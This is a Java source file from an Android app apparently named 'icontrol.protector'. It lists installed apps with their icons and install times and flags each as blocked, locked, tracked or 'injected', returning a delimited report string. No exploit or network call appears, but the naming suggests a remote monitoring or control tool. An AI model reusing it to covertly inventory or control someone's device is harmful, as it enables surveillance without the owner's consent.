package com.icontrol.protector;

import static com.icontrol.protector.AccessTools.Blocked_Apps;
import static com.icontrol.protector.AccessTools.Lock_App_list;
import static com.icontrol.protector.AccessTools.Map_Name_ID;
import static com.icontrol.protector.AccessTools.ject_list;
import static com.icontrol.protector.Consts.SPLIT_ARAY;
import static com.icontrol.protector.Consts.SPLIT_LINE;
import static com.icontrol.protector.UtliTools.drawableToBitmap;

import android.content.Context;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.util.Date;
import java.util.List;

public class Apps_Manage {
    private static StringBuffer LoadApps = new StringBuffer();
    public static String Load(Context c)  {
        try {
           // byte[] f = "null".getBytes();
            if (LoadApps.toString().length() != 0){
                LoadApps = new StringBuffer();
            }

            final PackageManager pm = c.getPackageManager();
            List<ApplicationInfo> pk = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            for (ApplicationInfo p : pk) {


                if (pm.getLaunchIntentForPackage(p.packageName) != null &&
                        !pm.getLaunchIntentForPackage(p.packageName).equals(""))
                {
//                    String permissionsString = "null";
//                    String activitiesString = "null";
//                    String reciversString = "null";


                    //Array of all <activity> pInf.activities to one string

//                    PackageInfo perimsinfo = pm.getPackageInfo(p.packageName, PackageManager.GET_PERMISSIONS);
//                    if(perimsinfo.requestedPermissions != null){
//                        StringBuilder permissionsStringBuilder = new StringBuilder();
//                        for (String permission : perimsinfo.requestedPermissions) {
//
//                            permissionsStringBuilder.append(permission).append("<X>");
//                        }
//                         permissionsString = permissionsStringBuilder.toString();
//                    }

//                    PackageInfo activisinfo = pm.getPackageInfo(p.packageName, PackageManager.GET_ACTIVITIES);
//                    if (activisinfo.activities != null) {
//                        StringBuilder activitiesStringBuilder = new StringBuilder();
//
//                        for (ActivityInfo activityInfo : activisinfo.activities) {
//
//                            activitiesStringBuilder.append(activityInfo.name).append("<X>");
//
//                        }
//                         activitiesString = activitiesStringBuilder.toString();
//                    }

//                    PackageInfo reciversinfo = pm.getPackageInfo(p.packageName, PackageManager.GET_RECEIVERS);
//                    if(reciversinfo.receivers != null){
//                        StringBuilder reciversStringBuilder = new StringBuilder();
//
//                        for (ActivityInfo reciverinfo : reciversinfo.receivers) {
//                            // Append the information you need, such as activity name, package name, etc.
//                            reciversStringBuilder.append(reciverinfo.name).append("<X>");
//
//                        }
//                        reciversString = reciversStringBuilder.toString();
//                    }

                    PackageInfo pInf = pm.getPackageInfo(p.packageName, PackageManager.GET_PERMISSIONS);
                    Date installTime = new Date(pInf.firstInstallTime);
                    String flag = "null";

                    if (pm.getLaunchIntentForPackage(p.packageName) != null) {
                        if ((p.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
                            flag = "System";
                        } else {
                            flag = "User";
                        }
                    }

                    String isenabled = "1";
                    try{
                        if(Blocked_Apps.contains(p.packageName.toString().toLowerCase())){
                            isenabled = "0";
                        }
                    }catch (Exception a){

                    }

                    String islocked = "0";
                    try{
                        if (Lock_App_list.contains(p.packageName.toString().toLowerCase())){
                            islocked = "1";
                        }
                    }catch (Exception a){

                    }
                    String istracked = "0";
                    try{

                        if (Map_Name_ID.containsKey(pm.getApplicationLabel(p))) {
                            istracked="1";
                        }
                    }catch (Exception a){

                    }

                    String isjected = "0";
                    try{
                        if (ject_list.contains(p.packageName.toString().toLowerCase())){
                            isjected = "1";
                        }
                    }catch (Exception a){

                    }

                    String baseString = "null";
                    try {
                        Drawable icon = c.getPackageManager().getApplicationIcon(p.packageName);

                        // Convert Drawable to Bitmap
                        Bitmap bitmap = drawableToBitmap(icon);

                        // Resize the Bitmap to 45x45
                        Bitmap resizedBitmap = Bitmap.createScaledBitmap(bitmap, 30, 30, false);

                        // Compress the resized Bitmap and convert to Base64
                        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
                        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 30, byteStream);
                        byte[] byteArray = byteStream.toByteArray();
                        baseString = Base64.encodeToString(byteArray, Base64.DEFAULT);
                    } catch (PackageManager.NameNotFoundException e) {
                        e.printStackTrace();
                        baseString="null";
                    }



                    //isenabled   islocked  istracked

                    LoadApps.append(pm.getApplicationLabel(p) +
                            SPLIT_ARAY +
                            flag +
                            SPLIT_ARAY +
                            p.packageName +
                            SPLIT_ARAY +
                            installTime+
                            SPLIT_ARAY +
                            baseString +
                            SPLIT_ARAY +
                            isenabled +
                            SPLIT_ARAY +
                            islocked +
                            SPLIT_ARAY +
                            istracked +
                            SPLIT_ARAY +
                            isjected +
                            SPLIT_LINE);
                }
            }

                try {
                    if (LoadApps.toString().length()!=0){


                        String s0 =  LoadApps.toString()  ;
                      //  f =  s0.getBytes();
                        return s0;
                    }
                } catch (Exception e) {}

        } catch (Exception e) {}
        return null;
    }
}
